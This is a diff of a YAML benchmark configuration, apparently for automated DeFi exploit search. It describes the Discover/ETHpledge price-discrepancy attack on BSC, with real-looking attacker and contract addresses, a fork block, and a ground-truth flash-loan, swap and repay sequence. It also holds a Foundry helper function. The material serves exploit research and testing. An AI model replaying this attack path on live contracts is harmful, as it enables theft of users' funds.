@@ -1,70 +1,110 @@
-# Information for benchmarks building.
 project_name: "Discover"
+blockchain: "bsc"
+blocknumber: 18_446_845
+attacker_addr: "0x446247bb10B77D1BCa4D4A396E014526D1ABA277"
+attack_goal_str: "busd"
 
-ctrt_name2cls:
-  - ["usdt", "USDT"]
-  - ["disc", "Discover"]
-  - ["pair", "UniswapV2Pair"]
-  - ["factory", "UniswapV2Factory"]
-  - ["router", "UniswapV2Router"]
-  - ["ethpledge", "ETHpledge"]
+contracts:
+  - ["busd", "BUSD", "IERC20", "0x55d398326f99059fF775485246999027B3197955"]
+  - ["disc", "Discover", "IERC20", "0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267"]
+  - ["pair", "UniswapV2Pair", "IUniswapV2Pair", "0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d"]
+  - ["ethpledge", "ETHpledge", "IETHpledge", "0xe732a7bD6706CBD6834B300D7c56a8D2096723A7"]
+  - ["owner", "", "", "0x8894E0a0c962CB723c1976a4421c95949bE2D4E3"]
 
-ctrt_name2deploy:
-  - ["usdt", ""]
-  - ["disc", "new Discover()"]
-  - ["pair", ""]
-  - ["factory", ""]
-  - ["router", ""]
-  - [
-      "ethpledge",
-      "new ETHpledge(
-      address(usdt),
-      address(disc),
-      address(0xdead), address(0xdead), address(pair))",
-    ]
-
-extra_actions:
-  - "function swap_ethpledge_attacker_usdt_disc(uint256 amount, uint256 amountOut) internal eurus {
-    usdt.approve(address(ethpledge), UINT256_MAX);
-    ethpledge.pledgein(amount);
-    }"
-
-extra_deployments: []
-extra_statements: []
-
-attack_goal_str: "usdt"
-
-groundtruth:
-  - ["borrow", "disc", "owner", "24000e18"]
-  - ["swap", "pair", "attacker", "disc", "usdt", "disc.balanceOf(attacker)", "pair.getAmountOut(disc.balanceOf(attacker), address(disc))"]
-  - ["swap", "ethpledge", "attacker", "usdt", "disc", "5000e18", "1"]
-  - ["payback", "disc", "owner", "24000e18 * 1003 / 1000"]
-
-# Information for search space building.
 roles:
-  "usdt":
+  "busd":
     is_asset: true
     is_erc20: true
-    is_stablecoin: true
   "disc":
     is_asset: true
     is_erc20: true
-    is_stablecoin: false
   "pair":
+    is_lendpool: true
+    lend_tokens: ["busd", "disc"]
     is_swappair: true
     is_uniswap: true
-    token_pair: ["usdt", "disc"]
-    support_swaps:
-      "usdt": ["disc", "usdt"]
-      "disc": ["disc", "usdt"]
-    is_oracle: true
-    oracle: "pair"
-    is_lendpool: true
+    token_pair: ["busd", "disc"]
   "ethpledge":
     is_swappair: true
-    token_pair: ["usdt", "disc"]
-    support_swaps:
-      "usdt": ["disc", "usdt"]
-      "disc": ["disc"]
+    token_pair: ["busd", "disc"]
+  "owner":
+    is_lendpool: true
+    lend_tokens: ["busd"]
 
-pattern: "Price Discrepancy"
+groundtruth:
+  - ["borrow", "busd", "owner", "19811e18"]
+  - ["swap", "ethpledge", "attacker", "busd", "disc", "2000e18", "1"]
+  - ["swap", "pair", "attacker", "disc", "busd", "disc.balanceOf(attacker)", "getAmountOut(address(pair), disc.balanceOf(attacker), address(disc)) * 9 / 10"]
+  - ["payback", "busd", "owner", "19811e18 * 1003 / 1000"]
+
+extra_actions:
+  - "function swap_ethpledge_attacker_busd_disc(uint256 amount, uint256 amountOut) internal foray {
+    address attacker1 = address(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930);
+    busd.approve(address(ethpledge), type(uint256).max);
+    ethpledge.pledgein(attacker1, amount);
+    vm.stopPrank();
+    vm.startPrank(attacker1);
+    disc.transfer(attacker, disc.balanceOf(attacker1));
+    vm.stopPrank();
+    vm.startPrank(attacker);
+    }"
+
+# Useless
+# # Information for benchmarks building.
+# project_name: "Discover"
+
+# ctrt_name2cls:
+#   - ["busd", "BUSD"]
+#   - ["disc", "Discover"]
+#   - ["pair", "UniswapV2Pair"]
+#   - ["factory", "UniswapV2Factory"]
+#   - ["router", "UniswapV2Router"]
+#   - ["ethpledge", "ETHpledge"]
+
+# ctrt_name2deploy:
+#   - ["busd", ""]
+#   - ["disc", "new Discover()"]
+#   - ["pair", ""]
+#   - ["factory", ""]
+#   - ["router", ""]
+#   - [
+#       "ethpledge",
+#       "new ETHpledge(
+#       address(busd),
+#       address(disc),
+#       address(0xdead), address(0xdead), address(pair))",
+#     ]
+
+# extra_deployments: []
+# extra_statements: []
+
+# attack_goal_str: "busd"
+
+# # Information for search space building.
+# roles:
+#   "busd":
+#     is_asset: true
+#     is_erc20: true
+#     is_stablecoin: true
+#   "disc":
+#     is_asset: true
+#     is_erc20: true
+#     is_stablecoin: false
+#   "pair":
+#     is_swappair: true
+#     is_uniswap: true
+#     token_pair: ["busd", "disc"]
+#     support_swaps:
+#       "busd": ["disc", "busd"]
+#       "disc": ["disc", "busd"]
+#     is_oracle: true
+#     oracle: "pair"
+#     is_lendpool: true
+#   "ethpledge":
+#     is_swappair: true
+#     token_pair: ["busd", "disc"]
+#     support_swaps:
+#       "busd": ["disc", "busd"]
+#       "disc": ["disc"]
+
+# pattern: "Price Discrepancy"
